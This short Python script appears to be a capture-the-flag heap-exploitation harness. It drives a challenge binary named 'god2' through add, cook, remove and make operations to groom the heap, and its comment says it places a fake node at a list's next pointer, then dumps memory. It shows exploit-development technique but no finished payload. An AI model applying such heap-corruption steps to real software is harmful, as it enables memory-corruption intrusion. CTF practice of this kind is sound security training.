import sys,os; sys.path.insert(0,"/mnt/c/Users/ha/Downloads/pwn")
from dumper import G
STEP=sys.argv[1] if len(sys.argv)>1 else "base"
g=G("god2")
g.add(b"UNIQ777"); g.add(b"A1"); g.add(b"B2"); g.cook(b"Beef noodles"); g.add(b"YY"); g.add(b"Z9"); g.cook(b"Beef noodles")
for t in (b"B2",b"Z9",b"A1",b"YY"): g.rm(t)
g.add(b"CC")
# make foods; find which lands at CC->next (fake node)
for i in range(5): g.make(b"F%d_xxxxxxxxxxxx"%i)
if STEP=="base":
    g.dump("foods as fake nodes"); g.close(); sys.exit()
